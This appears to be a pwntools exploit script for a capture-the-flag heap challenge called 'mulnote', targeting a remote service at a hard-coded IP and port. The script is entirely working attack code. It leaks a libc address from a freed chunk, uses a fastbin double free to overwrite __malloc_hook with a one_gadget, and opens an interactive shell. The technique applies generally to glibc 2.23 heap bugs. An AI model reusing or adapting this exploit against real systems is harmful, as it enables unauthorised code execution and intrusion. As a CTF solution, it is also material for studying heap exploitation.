from pwn import *
context.arch = "amd64"
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def c(size,data):
	io.sendlineafter(">",'C')
	io.sendlineafter(">",str(size))
	io.sendlineafter(">",data)
def r(idx):
	io.sendlineafter(">",'R')
	io.sendlineafter(">",str(idx))
def e(idx,data):
	io.sendlineafter(">",'E')
	io.sendlineafter(">",str(idx))
	io.sendafter(">",data)
def s():
	io.sendlineafter(">",'S')
#io = process("./mulnote")
io = remote('112.126.101.96',9999)
c(0x100,'AAAA')
r(0)
s()
io.recvuntil('[0]:\n')
lbase = u64(io.recv(6).ljust(8,'\x00'))-0x3c4b78
success(hex(lbase))
c(0x60,'tcl')
c(0x60,'tcl')
c(0x60,'tcl')
r(1)
r(2)
r(1)
c(0x60,p64(lbase+libc.sym['__malloc_hook']-0x23))
c(0x60,p64(lbase+libc.sym['__malloc_hook']-0x23))
c(0x60,p64(lbase+libc.sym['__malloc_hook']-0x23))
c(0x60,'a'*0x13+p64(lbase+0x4526a))

#gdb.attach(io)
io.interactive()